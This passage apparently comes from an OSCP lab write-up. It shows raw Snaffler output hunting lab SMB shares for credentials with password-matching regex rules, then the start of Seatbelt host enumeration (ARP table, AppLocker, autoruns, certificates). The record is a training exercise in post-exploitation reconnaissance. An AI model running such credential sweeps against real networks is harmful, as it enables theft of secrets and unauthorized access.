[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Created all sharefinder tasks.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Green}<\\DC20.oscp.exam\NETLOGON>(R) Logon server share
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Green}<\\DC20.oscp.exam\SYSVOL>(R) Logon server share
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Black}<\\SRV22.oscp.exam\ADMIN$>()
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Green}<\\SRV22.oscp.exam\ADMIN$>(R) Remote Admin
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Black}<\\SRV22.oscp.exam\C$>()
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Green}<\\SRV22.oscp.exam\C$>(R) Default share
[OSCP\b.martin@SRV22] 2026-02-22 15:15:37Z [Share] {Green}<\\WS26.oscp.exam\Transfer>(R)
[OSCP\b.martin@SRV22] 2026-02-22 15:15:43Z [File] {Red}<KeepPsCredentials|R|-SecureString|752.2kB|2026-02-22 15:14:18Z>(\\WS26.oscp.exam\Transfer\powerview.ps1) \n"C:\\Windows\\example\.ini"\ \|\ Get-IniContent\ -OutputObject\n\nOutputs\ the\ \.ini\ details\ as\ a\ proper\ nested\ PSObject\.\n\n\.EXAMPLE\n\n"C:\\Windows\\example\.ini"\ \|\ Get-IniContent\n\n\.EXAMPLE\n\n\$SecPassword\ =\ ConvertTo-SecureString\ 'Password123!'\ -AsPlainText\ -Force\n\$Cred\ =\ New-Object\ System\.Management\.Automation\.PSCredential\('TESTLAB\\dfm\.a',\ \$SecPassword\)\nGet-IniContent\ -Path\ \\\\PRIMARY\.testlab\.local\\C\$\\Temp\\GptTmp
[OSCP\b.martin@SRV22] 2026-02-22 15:15:43Z [File] {Red}<KeepCmdCredentials|R|passwo?r?d\s*=\s*[\'\"][^\'\"]....|586.5kB|2026-02-22 14:59:08Z>(\\WS26.oscp.exam\Transfer\PowerUp.ps1) ing\[]]\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \$Name,\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$UserName\ =\ 'john',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$Password\ =\ 'Password123!',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$LocalGroup\ =\ 'Administrators',\n\n\ \ \ \ \ \ \ \ \[Management\.Automation\.PSCredential]\n\ \ \ \ \ \ \ \ \[Management\.Automation\.Cre
[OSCP\b.martin@SRV22] 2026-02-22 15:15:43Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d\s*=\s*[\'\"][^\'\"]....|586.5kB|2026-02-22 14:59:08Z>(\\WS26.oscp.exam\Transfer\PowerUp.ps1) ing\[]]\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \$Name,\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$UserName\ =\ 'john',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$Password\ =\ 'Password123!',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$LocalGroup\ =\ 'Administrators',\n\n\ \ \ \ \ \ \ \ \[Management\.Automation\.PSCredential]\n\ \ \ \ \ \ \ \ \[Management\.Automation\.Cre
[OSCP\b.martin@SRV22] 2026-02-22 15:15:48Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|26.9MB|2019-09-07 00:29:27Z>(\\SRV22.oscp.exam\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[OSCP\b.martin@SRV22] 2026-02-22 15:15:48Z [File] {Red}<KeepCmdCredentials|R|passwo?r?d\s*=\s*[\'\"][^\'\"]....|586.5kB|2026-02-22 14:59:08Z>(\\SRV22.oscp.exam\C$\Users\b.martin\PowerUp.ps1) ing\[]]\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \$Name,\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$UserName\ =\ 'john',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$Password\ =\ 'Password123!',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$LocalGroup\ =\ 'Administrators',\n\n\ \ \ \ \ \ \ \ \[Management\.Automation\.PSCredential]\n\ \ \ \ \ \ \ \ \[Management\.Automation\.Cre
[OSCP\b.martin@SRV22] 2026-02-22 15:15:48Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d\s*=\s*[\'\"][^\'\"]....|586.5kB|2026-02-22 14:59:08Z>(\\SRV22.oscp.exam\C$\Users\b.martin\PowerUp.ps1) ing\[]]\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \$Name,\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$UserName\ =\ 'john',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$Password\ =\ 'Password123!',\n\n\ \ \ \ \ \ \ \ \[ValidateNotNullOrEmpty\(\)]\n\ \ \ \ \ \ \ \ \[String]\n\ \ \ \ \ \ \ \ \$LocalGroup\ =\ 'Administrators',\n\n\ \ \ \ \ \ \ \ \[Management\.Automation\.PSCredential]\n\ \ \ \ \ \ \ \ \[Management\.Automation\.Cre
[OSCP\b.martin@SRV22] 2026-02-22 15:15:52Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|13.5kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\scheduled\Maintenance\CL_Utility.ps1) \ \ \ \ \ \ \{\r\n\ \ \ \ \ \ \ \ \ \ \ \ return\ Environment\.GetFolderPath\(Environment\.SpecialFolder\.DesktopDirectory\);\r\n\ \ \ \ \ \ \ \ }\r\n\ \ \ \ }\r\n"@\r\n\r\n\ \ \ \ \$type\ =\ Add-Type\ -MemberDefinition\ \$methodDefinition\ -Name\ "DesktopPath"\ -PassThru\r\n\r\n\ \ \ \ return\ \$type::GetDesktopPath\r\n}\r\n\r\n\#\ Function\ to\ get\ startup\ path\r\nfunction\ Get-StartupPath\(\)\r\n\{\r\n\$methodDefinition\ =\ @"\r\n\ \ \ \ public\ static\ string\ GetStartupPath\r\n\ \ \ \ \{\r\n\ \ \ \ \ \ \ \ get\r
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|11.4kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\Audio\MF_AudioDiagnostic.ps1) e\ static\ extern\ int\ GetSystemMetrics\(int\ Index\);\r\n\r\n\t\tpublic\ static\ bool\ Remote\(\)\ \{\r\n\t\t\treturn\ \(0\ !=\ GetSystemMetrics\(SM_REMOTESESSION\)\);\r\n\t\t}\r\n\t}\r\n}\r\n"@\r\n\t\$type\ =\ Add-Type\ -TypeDefinition\ \$sourceCode\ -PassThru\r\n\r\n\treturn\ \$type::Remote\(\)\r\n}\r\n\r\nfunction\ ispostbackOnWin\(\$packName\)\r\n\{\r\n<\#\r\n\tDESCRIPTION\r\n\t\ \ ispostbackOnWin\ check\ whether\ package\ is\ postback\.\r\n\r\n\tARGUMENTS:\r\n\t\ \ packName\ :\ String\ value\ c
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|218.7kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\Audio\CL_Utility.ps1) ce\ =\ \(Get-WmiObject\ -query\ "select\ \*\ from\ win32_baseService\ where\ Name='Audiosrv'"\)\r\n\tif\(\$audioService\.State\ -ne\ "Running"\)\r\n\t\{\r\n\t\tSet-Service\ Audiosrv\ -StartupType\ Automatic\r\n\t\tStart-Service\ Audiosrv\ -PassThru\ -ErrorAction\ SilentlyContinue\r\n\t}\r\n}\r\n\r\nFunction\ Stop-AudioService\(\)\r\n\{\r\n\t<\#\r\n\ \ \ \ \ \ \ \ \.DESCRIPTION\r\n\ \ \ \ \ \ \ \ \ \ \ Function\ to\ stop\ Audio\ service\ forcefully\ \r\n\ \ \ \ \ \ \ \ \.PARAMETER\ \r\n\t\t\tNone\r\n\ \ \ \
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|6.6kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\Audio\RS_NotDefault.ps1) ero\)\)\r\n\ \ \ \ \ \ \ \ \ \ \ \ \{\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ return\ false;\r\n\ \ \ \ \ \ \ \ \ \ \ \ }\r\n\ \ \ \ \ \ \ \ \ \ \ \ return\ true;\r\n\ \ \ \ \ \ \ \ }\r\n\ \ \ \ }\r\n"@\ \r\n\r\n\ \ \ \ \$ProcessHandle\ =\ \(Get-Process\ -id\ \$pid\)\.Handle\r\n\t\$type\ =\ Add-Type\ \$definition\ -PassThru\r\n\ttry\r\n\t\{\r\n\t\t\#\ Enable\ SeTakeOwnershipPrivilege\r\n\t\t\$type\[0]::EnablePrivilege\(\$processHandle,\ 'SeTakeOwnershipPrivilege'\)\r\n\r\n\t\t\$key\ =\ \[Microsoft\.Win32\.Registry]::LocalMachine\.OpenSubKey\(\$regP
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|16.5kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1) \ \ \ \ \ \ \ return\ String\.Empty;\r\n\ \ \ \ }\r\n\r\n\ \ \ \ public\ static\ String\ EscapePath\(String\ Path\)\r\n\ \ \ \ \{\r\n\ \ \ \ \ \ \ \ return\ Path\.Replace\("\$",\ "`\$"\);\r\n\ \ \ \ }\r\n}\r\n"@\r\n\r\n\$type\ =\ Add-Type\ -TypeDefinition\ \$typeDefinition\ -PassThru\ -IgnoreWarnings\r\n\$type3\ =\ Add-Type\ -TypeDefinition\ \$typeDefinition3\ -PassThru\ \ -IgnoreWarnings\r\n\r\n\#\ Function\ to\ convert\ to\ WQL\ path\r\nfunction\ ConvertTo-WQLPath\(\[string]\$wqlPath\ =\ \$\(throw\ "N
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|49.1kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\PCW\RS_ProgramCompatibilityWizard.ps1) ript\ will\ replace\ this\ keyword\ with\ build\.arch\.\r\n\ \ \ \ return\ \("amd64"\ -eq\ "arm64"\);\r\n}\r\n\r\n\#\ This\ block\ of\ code\ sets\ up\ the\ manual\ troubleshooting\ portion\.\r\n\#\r\n\r\nAdd-Type\ -TypeDefinition\ \$typeDefinition\ -PassThru\ -IgnoreWarnings\r\n\r\n\$targetPath\ =\ \[WerUtil]::EscapePath\(\$targetPath\)\r\n\r\nif\(\$targetPath\ -eq\ \$null\)\r\n\{\r\n\ \ \ \ throw\ \$CompatibilityStrings\.Throw_INVALID_PATH\r\n}\r\n\r\n\#\ Initialize\r\n\r\nset-variable\ ve
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|28.9kB|2018-09-15 07:12:55Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\Printer\CL_Utility.ps1) PWStr\)]\r\n\ \ \ \ \ \ \ \ public\ string\ pConfigFile;\r\n\ \ \ \ }\r\n"@\r\n\r\n\ \ \ \ \$winSpoolType\ =\ Add-Type\ -MemberDefinition\ \$winSpoolDefinition\ -Name\ "winSpoolCL"\ -UsingNamespace\ "System\.Reflection","System\.Diagnostics"\ -PassThru\r\n\ \ \ \ return\ \$winSpoolType\r\n}\r\n\r\n\#\r\n\#\ Get\ the\ printer\ status\r\n\#\r\nfunction\ GetPrinterStatus\(\[string]\$printerName\)\r\n\{\r\n\ \ \ \ \#\r\n\ \ \ \ \#\ the\ function\ return\ value\r\n\ \ \ \ \#\r\n\ \ \ \ \[int]\$printStatus\ =\ 0\r
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|2kB|2018-09-15 07:12:55Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\Printer\RS_SpoolerCrashing.ps1) \(UnmanagedType\.Bool\)]\ bool\ bMachine\);\r\n"@\r\n\r\n\$RefreshPolicyType\ =\ Add-Type\ -MemberDefinition\ \$RefreshPolicyDefinition\ -Name\ "RefreshPolicyType"\ -UsingNamespace\ "System\.Reflection","System\.Diagnostics"\ -PassThru\r\n\r\n\[bool]\$return\ =\ \$RefreshPolicyType::RefreshPolicy\(\$true\)\r\n\[int]\$errorCode\ =\ \[System\.Runtime\.InteropServices\.Marshal]::GetLastWin32Error\(\)\r\nif\(-not\ \$return\)\r\n\{\r\n\ \ \ \ WriteFileAPIExceptionR
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|20.1kB|2018-09-15 07:12:40Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\Search\CL_Utility.ps1) \r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \{\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ throw\ new\ System\.ComponentModel\.Win32Exception\(error\);\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ }\r\n\ \ \ \ \ \ \ \ \ \ \ \ }\r\n\ \ \ \ \ \ \ \ }\r\n\ \ \ \ }\r\n"@\r\n\r\n\ \ \ \ \(Add-Type\ -TypeDefinition\ \$typeDefinition\ -PassThru\)\[0]::SetRestorePrivilege\(\)\r\n}\r\n\r\n\[uint32]\$GENERIC_ALL\ =\ 0x10000000L\r\n\[uint32]\$GENERIC_READ\ =\ 0x80000000L\r\n\[uint32]\$GENERIC_WRITE\ =\ 0x40000000L\r\n\[uint32]\$GENERIC_EXECUTE\ =\ 0x20000000L\r\n\r\n\#\ F
[OSCP\b.martin@SRV22] 2026-02-22 15:15:53Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|94.6kB|2018-09-15 07:12:54Z>(\\SRV22.oscp.exam\ADMIN$\diagnostics\system\speech\CL_Utilities.ps1) c\ extern\ int\ GetSystemMetrics\(int\ Index\);\r\n\r\n\t\t\tpublic\ static\ bool\ IsRemote\(\)\ \{\r\n\t\t\t\treturn\ \(0\ !=\ GetSystemMetrics\(SM_REMOTESESSION\)\);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n"@\r\n\t\$type\ =\ Add-Type\ -TypeDefinition\ \$sourceCode\ -PassThru\r\n\r\n\treturn\ \$type::IsRemote\(\)\r\n}\r\n\r\nfunction\ Get-AudioCapturingDevices\r\n\{\r\n\t<\#\r\n\t\tDESCRIPTION:\r\n\t\tLists\ all\ the\ recording\ devices\ available\ on\ the\ localhost\ with\ their\ details\.\r\n\r\n\t\tARGUMENT
[OSCP\b.martin@SRV22] 2026-02-22 15:15:54Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|26.9MB|2019-09-07 00:29:27Z>(\\SRV22.oscp.exam\C$\Windows\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[OSCP\b.martin@SRV22] 2026-02-22 15:15:55Z [File] {Green}<KeepNameContainsGreen|R|credential|95.5kB|2024-10-09 20:48:44Z>(\\SRV22.oscp.exam\ADMIN$\assembly\NativeImages_v4.0.30319_64\Microsoft.D05895ce3#\e64153cbadb88c482b8ca22c20a6ec87\Microsoft.DataTransfer.CredentialService.DataContracts.ni.dll) Microsoft.DataTransfer.CredentialService.DataContracts.ni.dll
[OSCP\b.martin@SRV22] 2026-02-22 15:15:55Z [File] {Green}<KeepNameContainsGreen|R|credential|55.5kB|2024-10-09 20:48:43Z>(\\SRV22.oscp.exam\ADMIN$\assembly\NativeImages_v4.0.30319_64\Microsoft.D2c7a270c#\f122510411709459d22533c0ae56a7d7\Microsoft.DataTransfer.PayloadCredentialProtection.ni.dll) Microsoft.DataTransfer.PayloadCredentialProtection.ni.dll
[OSCP\b.martin@SRV22] 2026-02-22 15:15:55Z [File] {Green}<KeepNameContainsGreen|R|credential|1.4kB|2024-10-09 20:48:43Z>(\\SRV22.oscp.exam\ADMIN$\assembly\NativeImages_v4.0.30319_64\Microsoft.D2c7a270c#\f122510411709459d22533c0ae56a7d7\Microsoft.DataTransfer.PayloadCredentialProtection.ni.dll.aux) Microsoft.DataTransfer.PayloadCredentialProtection.ni.dll.aux
[OSCP\b.martin@SRV22] 2026-02-22 15:15:55Z [File] {Green}<KeepNameContainsGreen|R|credential|812B|2024-10-09 20:48:44Z>(\\SRV22.oscp.exam\ADMIN$\assembly\NativeImages_v4.0.30319_64\Microsoft.D05895ce3#\e64153cbadb88c482b8ca22c20a6ec87\Microsoft.DataTransfer.CredentialService.DataContracts.ni.dll.aux) Microsoft.DataTransfer.CredentialService.DataContracts.ni.dll.aux
[OSCP\b.martin@SRV22] 2026-02-22 15:15:56Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|4.9kB|2018-09-15 09:10:30Z>(\\SRV22.oscp.exam\C$\ProgramData\Microsoft\AppV\Setup\OfficeIntegrator.ps1) ow\ have\ all\ the\ data\ to\ execute\ integrator\.exe\ to\ migrate\ the\ license\.\ Execute\ the\ program\ now\.\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \$integratorProcess\ =\ Start-Process\ \$integratorFileFullName\ \$integratorArguments\ -Passthru\ -Wait\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ if\ \(\$integratorProcess\.ExitCode\ -eq\ 0\)\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \{\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \$migrationSuccessful\ =\ \$true\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ }\r\n\ \ \ \ \ \
[OSCP\b.martin@SRV22] 2026-02-22 15:15:56Z [File] {Green}<KeepNameContainsGreen|R|credential|3.3kB|2018-09-15 07:13:55Z>(\\SRV22.oscp.exam\C$\ProgramData\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml) RoamingCredentialSettings.xml
[OSCP\b.martin@SRV22] 2026-02-22 15:15:57Z [File] {Yellow}<KeepDatabaseByExtension|R|^\.mdf$|40MB|2019-09-24 22:09:14Z>(\\SRV22.oscp.exam\C$\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\mssqlsystemresource.mdf) .mdf
[OSCP\b.martin@SRV22] 2026-02-22 15:15:57Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|4.9kB|2018-09-15 09:10:30Z>(\\SRV22.oscp.exam\C$\Users\All Users\Microsoft\AppV\Setup\OfficeIntegrator.ps1) ow\ have\ all\ the\ data\ to\ execute\ integrator\.exe\ to\ migrate\ the\ license\.\ Execute\ the\ program\ now\.\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \$integratorProcess\ =\ Start-Process\ \$integratorFileFullName\ \$integratorArguments\ -Passthru\ -Wait\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ if\ \(\$integratorProcess\.ExitCode\ -eq\ 0\)\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \{\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \$migrationSuccessful\ =\ \$true\r\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ }\r\n\ \ \ \ \ \
[OSCP\b.martin@SRV22] 2026-02-22 15:15:57Z [File] {Green}<KeepNameContainsGreen|R|credential|3.3kB|2018-09-15 07:13:55Z>(\\SRV22.oscp.exam\C$\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml) RoamingCredentialSettings.xml
[OSCP\b.martin@SRV22] 2026-02-22 15:15:58Z [File] {Green}<KeepNameContainsGreen|R|credential|53.3kB|2019-09-24 21:21:12Z>(\\SRV22.oscp.exam\C$\Program Files\Microsoft SQL Server\150\DTS\Extensions\Common\Microsoft.DataTransfer.CredentialService.DataContracts.dll) Microsoft.DataTransfer.CredentialService.DataContracts.dll
[OSCP\b.martin@SRV22] 2026-02-22 15:15:58Z [File] {Green}<KeepNameContainsGreen|R|credential|35.3kB|2019-09-24 21:21:12Z>(\\SRV22.oscp.exam\C$\Program Files\Microsoft SQL Server\150\DTS\Extensions\Common\Microsoft.DataTransfer.PayloadCredentialProtection.dll) Microsoft.DataTransfer.PayloadCredentialProtection.dll
[OSCP\b.martin@SRV22] 2026-02-22 15:16:01Z [File] {Red}<KeepPassOrKeyInCode|R|[\s]+-passw?o?r?d?|892.7kB|2019-09-24 21:26:10Z>(\\SRV22.oscp.exam\C$\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\SQLPS\en\Microsoft.SqlServer.Management.PSSnapins.dll-Help.xml) es=""><maml:name>NewPassword</maml:name><maml:description><maml:para>Specifies\ a\ new\ password\ for\ a\ SQL\ Server\ Authentication\ login\ ID\.\ Invoke-Sqlcmd\ changes\ the\ password\ and\ then\ exits\.\ -Username\ and\ -Password\ must\ also\ be\ specified,\ with\ -Password\ specifying\ the\ current\ password\ for\ the\ login\.\r\n</maml:para></maml:description><command:parameterValue\ required="true"\ variableLength="false">String</
[OSCP\b.martin@SRV22] 2026-02-22 15:20:36Z [Info] Status Update:
ShareFinder Tasks Completed: 0
ShareFinder Tasks Remaining: 3
ShareFinder Tasks Running: 3
TreeWalker Tasks Completed: 6901
TreeWalker Tasks Remaining: 20
TreeWalker Tasks Running: 20
FileScanner Tasks Completed: 12826
FileScanner Tasks Remaining: 20
FileScanner Tasks Running: 20
82.8MB RAM in use.

ShareScanner queue finished, rebalancing workload.
Insufficient FileScanner queue size, rebalancing workload.
Max ShareFinder Threads: 0
Max TreeWalker Threads: 21
Max FileScanner Threads: 39
Been Snafflin' for 00:05:00.0181043 and we ain't done yet...

[OSCP\b.martin@SRV22] 2026-02-22 15:20:36Z [Info] Status Update:
ShareFinder Tasks Completed: 3
ShareFinder Tasks Remaining: 0
ShareFinder Tasks Running: 0
TreeWalker Tasks Completed: 6921
TreeWalker Tasks Remaining: 0
TreeWalker Tasks Running: 0
FileScanner Tasks Completed: 12846
FileScanner Tasks Remaining: 0
FileScanner Tasks Running: 0
82.8MB RAM in use.

Insufficient FileScanner queue size, rebalancing workload.
Max ShareFinder Threads: 0
Max TreeWalker Threads: 22
Max FileScanner Threads: 38
Been Snafflin' for 00:05:00.0181043 and we ain't done yet...

[OSCP\b.martin@SRV22] 2026-02-22 15:20:36Z [Info] Finished at 2/22/2026 7:20:36 AM
[OSCP\b.martin@SRV22] 2026-02-22 15:20:36Z [Info] Snafflin' took 00:05:00.0181043
Snaffler out.
I snaffled 'til the snafflin was done.
```

---


# Seatbelt結果（長文注意）

```powershell


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== AMSIProviders ======

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

  [*] AppIDSvc service is Stopped

    [*] Applocker is not running because the AppIDSvc is not running

  [*] AppLocker not configured
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static


  Ethernet1 --- Index 3
    Interface Description : Intel(R) 82574L Gigabit Network Connection
    Interface IPs      : 172.16.104.202
    DNS Servers        : 172.16.104.200

    Internet Address      Physical Address      Type
    172.16.104.200        00-50-56-8A-9B-41     Dynamic
    172.16.104.206        00-50-56-8A-93-41     Dynamic
    172.16.104.254        00-00-00-00-00-00     Invalid
    172.16.104.255        FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 4:00:00 AM
CurrentUser\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
